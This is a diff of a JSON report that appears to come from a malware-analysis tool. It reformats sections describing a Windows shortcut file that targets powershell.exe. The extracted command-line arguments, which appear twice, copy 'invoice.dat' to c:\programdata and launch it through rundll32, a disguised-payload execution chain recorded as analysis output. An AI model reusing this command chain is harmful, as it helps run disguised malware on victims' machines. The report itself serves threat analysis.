@@ -5,7 +5,25 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [4.172670817481952, 3.6814860524588946, 4.106733775632302, 3.407360908247836, 4.19477163259165, 4.553814491688465, 3.410601180069671, 3.8854116148503945]}}",
+        "body": {
+          "data": {
+            "domain": [
+              0,
+              8
+            ],
+            "values": [
+              4.172670817481952,
+              3.6814860524588946,
+              4.106733775632302,
+              3.407360908247836,
+              4.19477163259165,
+              4.553814491688465,
+              3.410601180069671,
+              3.8854116148503945
+            ]
+          },
+          "type": "colormap"
+        },
         "body_config": {},
         "body_format": "GRAPH_DATA",
         "classification": "TLP:C",
@@ -18,7 +36,24 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"flags\": \"IDList, LinkInfo, RelativePath, CommandArgs, IconFile, Unicode, TargetMetadata\", \"file_attributes\": \"Archive\", \"create_date\": \"2020:11:06 17:26:06+00:00\", \"access_date\": \"2022:02:15 10:25:47+00:00\", \"modify_date\": \"2020:11:06 17:26:06+00:00\", \"target_file_size\": 452608, \"icon_index\": 5, \"run_window\": \"Normal\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"powershell.exe\", \"drive_type\": \"Fixed Disk\", \"local_base_path\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"relative_path\": \"..\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"command_line_arguments\": \"cmd.exe /c xcopy /y invoice.dat c:\\\\programdata\\\\  && C:\\\\Windows\\\\System32\\\\rundll32.exe c:\\\\programdata\\\\invoice.dat,nmrecord\", \"icon_file_name\": \"%systemroot%\\\\system32\\\\imageres.dll\", \"machine_id\": \"desktop-i8bn9qk\"}",
+        "body": {
+          "access_date": "2022:02:15 10:25:47+00:00",
+          "command_line_arguments": "cmd.exe /c xcopy /y invoice.dat c:\\programdata\\  && C:\\Windows\\System32\\rundll32.exe c:\\programdata\\invoice.dat,nmrecord",
+          "create_date": "2020:11:06 17:26:06+00:00",
+          "drive_type": "Fixed Disk",
+          "file_attributes": "Archive",
+          "flags": "IDList, LinkInfo, RelativePath, CommandArgs, IconFile, Unicode, TargetMetadata",
+          "hot_key": "(none)",
+          "icon_file_name": "%systemroot%\\system32\\imageres.dll",
+          "icon_index": 5,
+          "local_base_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "machine_id": "desktop-i8bn9qk",
+          "modify_date": "2020:11:06 17:26:06+00:00",
+          "relative_path": "..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "run_window": "Normal",
+          "target_file_dosname": "powershell.exe",
+          "target_file_size": 452608
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -77,7 +112,9 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"machine_identifier\": \"desktop-i8bn9qk\"}",
+        "body": {
+          "machine_identifier": "desktop-i8bn9qk"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -97,7 +134,12 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"command_line_arguments\": \"cmd.exe /c xcopy /y invoice.dat c:\\\\programdata\\\\  && C:\\\\Windows\\\\System32\\\\rundll32.exe c:\\\\programdata\\\\invoice.dat,nmrecord\", \"local_base_path\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"relative_path\": \"..\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"target_file_dosname\": \"Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"}",
+        "body": {
+          "command_line_arguments": "cmd.exe /c xcopy /y invoice.dat c:\\programdata\\  && C:\\Windows\\System32\\rundll32.exe c:\\programdata\\invoice.dat,nmrecord",
+          "local_base_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "relative_path": "..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "target_file_dosname": "Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
